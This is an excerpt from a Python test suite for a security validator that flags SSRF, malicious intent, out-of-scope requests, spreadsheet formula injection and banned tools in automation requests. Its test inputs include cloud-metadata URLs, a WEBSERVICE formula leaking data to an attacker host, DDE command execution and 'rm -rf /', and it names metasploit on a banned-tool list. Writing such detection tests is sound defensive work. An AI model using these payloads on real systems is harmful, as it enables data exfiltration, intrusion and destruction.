...
class TestSecurityValidator:
    ...
    def test_detect_ssrf_attempts(self):
        ...
        has_ssrf, patterns = self.validator.detect_ssrf_attempts("GET http://169.254.169.254/latest/meta-data/")
        assert has_ssrf is True
        assert "169.254.169.254" in str(patterns)
        
        # GCP metadata
        has_ssrf, patterns = self.validator.detect_ssrf_attempts("curl metadata.google.internal/computeMetadata/v1/")
        assert has_ssrf is True
        
        # Local services
        has_ssrf, patterns = self.validator.detect_ssrf_attempts("Connect to localhost:8080")
        assert has_ssrf is True
        
        # Private IP ranges
        has_ssrf, patterns = self.validator.detect_ssrf_attempts("Access 192.168.1.1 for configuration")
        assert has_ssrf is True
        
        # Legitimate URLs should not trigger
        has_ssrf, patterns = self.validator.detect_ssrf_attempts("Connect to api.example.com")
        assert has_ssrf is False
    
    def test_detect_malicious_intent(self):
        """Test malicious intent detection."""
        # Penetration testing
        has_malicious, patterns = self.validator.detect_malicious_intent("Perform penetration testing on the system")
        assert has_malicious is True
        
        # Security testing
        has_malicious, patterns = self.validator.detect_malicious_intent("Run security audit and vulnerability scan")
        assert has_malicious is True
        
        # Attack patterns
        has_malicious, patterns = self.validator.detect_malicious_intent("Exploit SQL injection vulnerability")
        assert has_malicious is True
        
        # Legitimate business automation should not trigger
        has_malicious, patterns = self.validator.detect_malicious_intent("Automate invoice processing workflow")
        assert has_malicious is False
    
    def test_detect_out_of_scope(self):
        """Test out-of-scope detection."""
        # Security testing requests
        has_out_of_scope, patterns = self.validator.detect_out_of_scope("Test security vulnerabilities in the application")
        assert has_out_of_scope is True
        
        # Metadata access requests
        has_out_of_scope, patterns = self.validator.detect_out_of_scope("Access metadata from cloud services")
        assert has_out_of_scope is True
        
        # Credential harvesting
        has_out_of_scope, patterns = self.validator.detect_out_of_scope("Extract credentials from the database")
        assert has_out_of_scope is True
        
        # Legitimate business requests should not trigger
        has_out_of_scope, patterns = self.validator.detect_out_of_scope("Process customer orders automatically")
    ...
    def test_detect_formula_injection(self):
        ...
        has_formula, patterns = self.validator.detect_formula_injection('=WEBSERVICE("http://attacker/leak")')
        assert has_formula is True
        assert len(patterns) > 0
        
        # Multiple dangerous functions
        has_formula, patterns = self.validator.detect_formula_injection('=HYPERLINK("http://evil.com", "click me")')
        assert has_formula is True
        
        # DDE injection
        has_formula, patterns = self.validator.detect_formula_injection('=DDE("cmd","/c calc.exe")')
        assert has_formula is True
        
        # Command execution
        has_formula, patterns = self.validator.detect_formula_injection('=CMD("rm -rf /")')
        assert has_formula is True
        ...
        has_formula, patterns = self.validator.detect_formula_injection("Process customer orders automatically")
        assert has_formula is False
        
        # Text with equals in middle should not trigger
        has_formula, patterns = self.validator.detect_formula_injection("Set status = completed")
        assert has_formula is False
    ...
    def test_validate_business_automation_scope(self):
        ...
        is_valid, reason, violations = self.validator.validate_business_automation_scope(
    ...
    def test_banned_tools_validation(self):
        ...
        assert self.validator.validate_no_banned_tools("Use metasploit for testing") is False
        ...
        assert self.validator.validate_no_banned_tools("Implement with React and Node.js") is True
...
class TestPatternSanitizer:
    ...
    def test_is_security_testing_pattern(self):
        ...
        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(formula_injection_pattern)
        ...
        ssrf_pattern = {
            ...
            "tech_stack": ["Python", "Requests Library"],
            "constraints": {
                "required_integrations": ["Enable web access and GET http://169.254.169.254/latest/meta-data/"]
            }
        }
        
        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(ssrf_pattern)
        assert is_security_testing is True
        ...
        legitimate_pattern = {
            ...
            "constraints": {
                "required_integrations": ["ERP System", "Email Service"]
            }
        }
        
        is_security_testing, reason = self.sanitizer.is_security_testing_pattern(legitimate_pattern)
    ...
    def test_sanitize_pattern_for_storage(self):
        ...
        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(formula_injection_pattern)
        ...
        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(malicious_pattern)
        assert should_store is False
        assert "Pattern blocked" in reason
        ...
        legitimate_pattern = {
            ...
            "constraints": {
                "required_integrations": ["CRM System", "Email Service"]
            }
        }
        
        should_store, sanitized, reason = self.sanitizer.sanitize_pattern_for_storage(legitimate_pattern)
...
class TestSecurityIntegration:
    ...
    def test_end_to_end_malicious_intent_blocking(self):
        ...
        is_valid, message = input_validator.validate_requirements_text(malicious_request)
    ...
    def test_legitimate_automation_allowed(self):
        ...
        is_valid, message = input_validator.validate_requirements_text(legitimate_request)
